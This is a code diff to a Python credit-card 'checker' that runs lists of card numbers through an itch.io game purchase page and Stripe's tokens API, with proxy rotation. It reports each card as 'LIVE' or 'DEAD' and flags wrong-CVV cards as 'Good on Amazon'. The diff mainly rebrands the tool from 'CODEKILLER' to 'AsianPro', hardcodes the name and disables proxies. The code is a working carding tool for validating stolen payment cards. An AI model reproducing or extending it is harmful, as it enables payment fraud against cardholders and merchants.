@@ -37,8 +37,8 @@ class StripeChecker():
         self.purchase = "https://puppetcombo.itch.io/nun-massacre/purchase"
         self.stripe_tokens = "https://api.stripe.com/v1/tokens"
 
-        print("\n\n  {}------=[ {}CODEKILLER CHECKER {}]=------".format(fg[0], fg[1], fg[0]))
-        print("      {}--= {}Created by Codekiller {}=--          ".format(fg[0], fg[1], fg[0]))
+        print("\n\n  {}------=[ {}ASIANPRO CHECKER {}]=------".format(fg[0], fg[1], fg[0]))
+        print("      {}--= {}Created by ~AsianPro~ {}=--          ".format(fg[0], fg[1], fg[0]))
         print("  {}------========================------\n".format(fg[0]))
         self.check()
 
@@ -56,9 +56,9 @@ class StripeChecker():
                 proxy_lists.append(x)
 
         proxy_pool = cycle(proxy_lists)
-        Username = str(input(fg[2] + '[*]' + reset + ' Enter Full Name: '))
-        zipcode = str(input(fg[2] + '[*]' + reset + "Enter CC's ZipCode: "))
-        proxyused = str(input(fg[5] + '[?]' + reset + ' Use Proxy?[y/n] '))
+        Username = str("AsianPro")
+        zipcode = str(input(fg[2] + '[*]' + reset + "ZipCode: "))
+        proxyused = str("n")
         isproxyused = False
 
         if proxyused.lower() == "y":
@@ -154,17 +154,17 @@ class StripeChecker():
                 error_msg = error.find('div', {'class': 'form_errors'}).get_text()
 
                 if error_msg == "Your card's security code is incorrect.":
-                    print(fg[1] + "┌───────[ " + credit_card + " ]──(" + str(credit_entry) + ")")
-                    print(fg[1] + "└────────── LIVE! ~> But Incorrect CVV (Good on Amazon)")
+                    print(fg[1] + "AsianPro[ " + credit_card + " ]---(" + str(credit_entry) + ")")
+                    print(fg[1] + "|----------- LIVE! ~> But Incorrect CVV (Good on Amazon)")
 
                 else:
-                    print(fg[0] + "┌───────[ " + credit_card + " ]──(" + str(credit_entry) + ")")
-                    print(fg[0] + "└────────── " + reset + "DEAD >>> Reason: " + str(error_msg))
+                    print(fg[0] + "AsianPro[ " + credit_card + " ]---(" + str(credit_entry) + ")")
+                    print(fg[0] + "|----------- " + reset + "DEAD >>> Reason: " + str(error_msg))
 
             except Exception as e:
                 print(e)
-                print(fg[1] + "┌───────[ " + credit_card + " ]──(" + str(credit_entry) + ")")
-                print(fg[1] + "└────────── LIVE!")
+                print(fg[1] + "AsianPro[ " + credit_card + " ]---(" + str(credit_entry) + ")")
+                print(fg[1] + "|----------- LIVE!")
         print()
         print(fg[3] + "[*]" + reset + " Checking Done! " + str(len(cc_list)))
         print()
